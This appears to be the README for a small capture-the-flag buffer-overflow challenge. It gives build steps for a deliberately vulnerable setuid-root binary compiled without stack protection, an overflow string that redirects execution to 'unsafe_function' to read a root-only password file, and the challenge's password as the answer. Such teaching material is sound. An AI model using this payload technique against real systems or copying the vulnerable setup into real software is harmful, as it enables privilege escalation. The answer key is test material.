# HackTheStack
There are two files in this folder: buffer.c and pwdfile
Both of these should be included in the problem directory, but a compiled buffer.c should also be included.

Compile with:

    gcc -m32 -fno-stack-protector -g buffer.c -o buffer

Owner of buffer should be root and setuid should be set.
Furthermore, the pwdfile should be chmodded to "400" so that only root can read it.

The solution to this problem is to overflow the argv buffer by passing in the following string:

    "????????pwdfile\xff????????????\xc9\x55\x56\x57" 

where the "?"s can be arbitrary characters and the last four bytes
should be replaced by the location of "unsafe_function" in memory (to be determined at compile time)

(the password is `collatzhotpo`)
